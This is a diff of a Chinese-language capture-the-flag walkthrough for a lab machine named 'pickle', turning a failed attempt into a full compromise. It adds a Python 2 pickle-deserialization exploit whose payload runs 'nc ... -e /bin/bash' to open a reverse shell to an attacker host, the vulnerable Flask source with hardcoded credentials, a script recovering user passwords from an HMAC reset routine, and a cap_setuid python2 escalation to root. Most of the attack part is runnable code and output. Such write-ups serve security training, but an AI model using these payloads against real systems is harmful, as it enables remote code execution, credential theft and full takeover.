@@ -265,47 +265,249 @@ open_page = pickle.loads(open_page)
 return str(open_page)
 ```
 
-### 尝试利用
+并且根据报错信息，可以得到环境的 Python 版本
 
-在网上可以找到这篇 payload
-
-```python
-import os
-import pickle
-import hashlib
-import requests
-
-class CommandExecute(object):
-    def __reduce__(self):
-        return (os.system, ('ping -c 2 192.168.0.17',))
-
-convert_data = pickle.dumps(CommandExecute())
-convert_crypt = hashlib.md5(convert_data).hexdigest()
-send_requests = requests.post('http://192.168.0.44:1337/', data={"story":convert_data, "submit":"Submit+Query"}, auth=("lucas", "SuperSecretPassword123!"))
-check_requests = requests.post('http://192.168.0.44:1337/checklist', data={"check":convert_crypt}, auth=("lucas", "SuperSecretPassword123!"))
-print(check_requests.text)
+```plaintext
+Python 2.7
 ```
 
-但是实际上由于传输过程中的编码缘故，最终计算出来的哈希不应该由 `hashlib.md5(pickle.dumps(CommandExecute())).hexdigest()` 来计算，建议开一个 Burp Suite 抓包进行计算
+### 尝试利用
 
 :::warning
 
-这里会遇到远程服务接受的数据与本地发送的数据不一致的问题，挺神奇，即使我直接本地用相同的代码起了一个相同的服务端，都没找到问题在哪里
-
-按理来说，http 发送前会经历一遍 url encode 之后，在服务端再执行 url decode 一遍，但是不清楚哪里出现问题
-
-严重卡壳
+利用脚本必须使用 Python2 进行编写并运行，因为 Python3 与 Python2 之间的 Pickle 的运行方式存在差异
 
 :::
 
-## Failed
+```python
+#coding:utf-8
+import os
+import cPickle
+import hashlib
+import requests
 
-死题了，入口点都进不去，就是找不到具体的入口点哈希计算哪里出现问题
+
+class CommandExecute(object):
+        def __reduce__(self):
+                return (os.system, ('nc 192.168.56.102 9999 -e /bin/bash',))
+
+convert_data = cPickle.dumps(CommandExecute())
+convert_crypt = hashlib.md5(convert_data).hexdigest()
+send_requests = requests.post('http://192.168.56.118:1337/', data={"story":convert_data, "submit":"Submit+Query"}, auth=("lucas", "SuperSecretPassword123!"))
+check_requests = requests.post('http://192.168.56.118:1337/checklist', data={"check":convert_crypt}, auth=("lucas", "SuperSecretPassword123!"))
+print(check_requests.text)
+```
+
+运行即可收到回连的 shell
+
+## User - lucas
+
+```shell
+┌─[randark@parrot]─[~]
+└──╼ $ pwncat-cs -lp 9999
+[15:29:38] Welcome to pwncat 🐈!
+[15:29:40] received connection from 192.168.56.118:42900
+[15:29:40] 0.0.0.0:9999: normalizing shell path
+[15:29:41] 192.168.56.118:42900: registered new host w/ db
+(local) pwncat$ back
+(remote) lucas@pickle:/home/lucas$ whoami
+lucas
+```
+
+### 查看服务源码
+
+```python title="/opt/project/project.py"
+from functools import wraps
+from flask import *
+import hashlib
+import socket
+import base64
+import pickle
+import hmac
+
+app = Flask(__name__, template_folder="templates", static_folder="/opt/project/static/")
+
+def check_auth(username, password):
+       """This function is called to check if a username /
+       password combination is valid.
+       """
+       return username == 'lucas' and password == 'SuperSecretPassword123!'
+
+def authenticate():
+       """Sends a 401 response that enables basic auth"""
+       return Response(
+       'Could not verify your access level for that URL.\n'
+       'You have to login with proper credentials', 401,
+       {'WWW-Authenticate': 'Basic realm="Pickle login"'})
+
+def requires_auth(f):
+       @wraps(f)
+       def decorated(*args, **kwargs):
+           auth = request.authorization
+           if not auth or not check_auth(auth.username, auth.password):
+               return authenticate()
+           return f(*args, **kwargs)
+       return decorated
+
+@app.route('/', methods=["GET", "POST"])
+@requires_auth
+def index_page():
+        '''
+                __index_page__()
+        '''
+        if request.method == "POST" and request.form["story"] and request.form["submit"]:
+                md5_encode = hashlib.md5(request.form["story"]).hexdigest()
+                paths_page  = "/opt/project/uploads/%s.log" %(md5_encode)
+                write_page = open(paths_page, "w")
+                write_page.write(request.form["story"])
+
+                return "The message was sent successfully!"
+
+        return render_template("index.html")
+
+@app.route('/reset', methods=["GET", "POST"])
+@requires_auth
+def reset_page():
+        '''
+                __reset_page__()
+        '''
+        if request.method == "POST" and request.form["username"] and request.form["key"]:
+                key    = "dpff43f3p214k31301"
+                raw    = request.form["username"] + key + socket.gethostbyname(socket.gethostname())
+                hashed = hmac.new(key, raw, hashlib.sha1)
+                if request.form["key"] == hashed.hexdigest():
+                        return base64.b64encode(hashed.digest().encode("base64").rstrip("\n"))
+        else:
+                return "Server Error!"
+        return render_template("reset.html")
+
+
+@app.route('/checklist', methods=["GET", "POST"])
+@requires_auth
+def check_page():
+        '''
+                __check_page__()
+        '''
+        if request.method == "POST" and request.form["check"]:
+                path_page    = "/opt/project/uploads/%s.log" %(request.form["check"])
+                open_page    = open(path_page, "rb").read()
+                if "p1" in open_page:
+                        open_page = pickle.loads(open_page)
+                        return str(open_page)
+                else:
+                        return open_page
+        else:
+                return "Server Error!"
+
+        return render_template("checklist.html")
+
+@app.route('/console')
+@requires_auth
+def secret_page():
+        return "Server Error!"
+
+if __name__ == '__main__':
+        app.run(host='0.0.0.0', port=1337, debug=True)
+```
+
+在这里，可以看到原先没有内容的 `/reset` 路由有了相关逻辑处理
+
+```python
+@app.route('/reset', methods=["GET", "POST"])
+@requires_auth
+def reset_page():
+        '''
+                __reset_page__()
+        '''
+        if request.method == "POST" and request.form["username"] and request.form["key"]:
+                key    = "dpff43f3p214k31301"
+                raw    = request.form["username"] + key + socket.gethostbyname(socket.gethostname())
+                hashed = hmac.new(key, raw, hashlib.sha1)
+                if request.form["key"] == hashed.hexdigest():
+                        return base64.b64encode(hashed.digest().encode("base64").rstrip("\n"))
+        else:
+                return "Server Error!"
+        return render_template("reset.html")
+```
+
+借此，我们能够有机会恢复出 `lucas` 和 `mark` 两个用户的用户密码
+
+将脚本相关部分的代码提取出来，尝试利用
+
+:::warning
+
+由于涉及到 `socket.gethostbyname(socket.gethostname()` 执行，建议在靶机上运行
+
+:::
+
+```python
+import hashlib
+# import requests
+import socket
+import base64
+import hmac
+
+
+key = "dpff43f3p214k31301"
+raw = "lucas" + key + socket.gethostbyname(socket.gethostname())
+hashed = hmac.new(key, raw, hashlib.sha1)
+
+print(base64.b64encode(hashed.digest().encode("base64").rstrip("\n")))
+```
+
+运行之后，得到
+
+```shell
+(remote) lucas@pickle:/tmp$ python2 attck.py
+YTdYYTB1cDFQOTBmeEFwclVXZVBpTCtmakx3PQ==
+```
+
+将用户名修改为 `mark` 之后，得到
+
+```shell
+(remote) lucas@pickle:/tmp$ python2 attck.py
+SUk5enROY2FnUWxnV1BUWFJNNXh4amxhc00wPQ==
+```
+
+## User - mark
+
+```shell
+(remote) lucas@pickle:/tmp$ su mark
+Password:
+mark@pickle:/tmp$ whoami
+mark
+```
 
 ### flag - user
 
 ```plaintext
 e25fd1b9248d1786551e3412adc74f6f
+```
+
+### 环境探测
+
+```shell
+mark@pickle:~$ ls -lh
+total 3.6M
+-rwxr-xr-x 1 root root 3.6M Oct 11  2020 python2
+-rw-r----- 1 mark mark   33 Oct 11  2020 user.txt
+```
+
+可以看到这里的 `python2` 二进制文件的所有者是 `root`，但是给予了当前用户运行权限，查看文件的更多权限
+
+```shell
+mark@pickle:~$ getcap -r ./ 2>/dev/null
+./python2 = cap_setuid+ep
+```
+
+既然 `./python2` 这个文件拥有 `cap_setuid` 权限，那么就很好办了
+
+## User - root
+
+```shell
+mark@pickle:~$ ./python2 -c 'import os,pty;os.setuid(0),pty.spawn("/bin/bash")'
+root@pickle:~# whoami
+root
 ```
 
 ### flag - root
